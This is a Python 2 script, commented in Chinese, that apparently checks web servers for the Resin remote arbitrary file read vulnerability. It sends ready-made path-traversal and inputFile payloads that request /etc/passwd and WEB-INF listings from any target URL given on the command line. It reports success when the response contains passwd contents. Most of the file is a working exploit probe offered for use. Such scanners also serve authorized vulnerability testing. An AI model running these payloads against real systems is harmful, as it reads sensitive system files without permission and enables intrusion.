#  -*- coding:utf-8 -*-

"""
    Resin远程任意文件读取漏洞
"""

#引入依赖库、包文件
import os
import sys
import urllib
import logging
import requests

#设置全局配置
reload(sys)
sys.setdefaultencoding('utf-8')
logging.basicConfig(format="%(message)s",level=logging.INFO)


#定义全局变量和全局函数
payload1 = "/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd"
payload2 = "/resin-doc/examples/jndi-appconfig/test?inputFile=../../../../../../../../../../etc/passwd"
payload3 = "/ ..\\\\web-inf"
payloadList = [payload1,payload2,payload3]


def getUrl(url):
    urList = []
    if url != None and isinstance(url,str):
        if url.find(":") >= 3:
            protocol = url.split(":")[0]+"://"
            hostname = url.split(":")[1].split("/")[2]
            for payload in payloadList:
                tUrl = protocol + hostname + payload
                urList.append(tUrl)
                enUrl = urllib.quote(tUrl)
                urList.append(enUrl)
    else:
        pass
    return urList


class ResinScan:
    def __init__(self,url):
        self.tUrList = getUrl(url)
        self.flag = ["root:x:0:0:root:/root","<h1>Directory of"]
    def scan(self):
        for url in self.tUrList:
            try:
                response = requests.get(url,timeout=3,verify=False)
                for string in self.flag:
                    if response.content.find(string) >= 0:
                        return True
            except Exception,reason:
                logging.info("[-] 扫描错误--错误原因：%s"%str(reason))
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except Exception,reason:
        logging.info("[-] 没有找到目标站点")
        exit(0)
    scan = ResinScan(url)
    if scan.scan():
        logging.info("[+] 发现漏洞!")